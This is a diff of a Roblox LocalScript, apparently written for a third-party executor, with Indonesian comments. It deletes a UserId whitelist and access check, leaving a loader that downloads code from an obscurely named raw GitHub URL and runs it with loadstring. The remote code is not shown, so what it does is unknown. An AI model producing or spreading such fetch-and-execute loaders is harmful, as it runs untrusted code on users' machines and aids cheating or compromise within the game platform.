@@ -1,59 +1,13 @@
--- LocalScript (put in StarterPlayerScripts)
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-
--- Masukkan UserId yang diizinkan (contoh)
-local ALLOWED_IDS = {
-	9464607503,
-	1444873051,
-	7854965065,
-	9529082141,
-	2314101743,
-	9348359815,
-	8868906888,
-	9114573649,
-	9383243342,
-	8427443610,
-	7962577003,
-	8001911236,
-	2322953887,
-	9480072017,
-	9312857030,
-	9576768452,
-	5464154339,
-	7507528154,
-	8309815866,
-	8238519054
-}
-
-
-local function isAllowed(id)
-    for _, v in ipairs(ALLOWED_IDS) do
-        if v == id then return true end
-    end
-    return false
-end
-
--- URL script remote (pakai URL yang kamu berikan)
+-- LocalScript (StarterPlayerScripts)
 local SCRIPT_URL = "https://raw.githubusercontent.com/PremiumVersion/csvegrgrrgr/refs/heads/main/grhghrgrgrrghrhrhrgrfewfeklgbhervuirgyuegfeyrfgreyfgruy8rgregr8gr87gftryregfer8r"
 
--- Pastikan LocalPlayer sudah tersedia (biasanya sudah)
-if not player then
-    Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
-    player = Players.LocalPlayer
-end
-
-if not isAllowed(player.UserId) then
-    -- Jika tidak diizinkan, hentikan eksekusi
-    warn("Access Denied: your UserId is not allowed to run this script.")
-    return
-end
-
--- Jika diizinkan, ambil dan jalankan remote script
 local ok, err = pcall(function()
     local http = game:GetService("HttpService")
-    -- Attempt to fetch; HttpGet bisa dibatasi oleh environment/executor
+
+    -- Ambil script dari URL
     local remoteCode = game:HttpGet(SCRIPT_URL)
+
+    -- Jalankan
     local fn = loadstring(remoteCode)
     if type(fn) == "function" then
         fn()
@@ -63,5 +17,5 @@ local ok, err = pcall(function()
 end)
 
 if not ok then
-    warn("Failed to run remote script:", err)
+    warn("Failed to execute remote script:", err)
 end
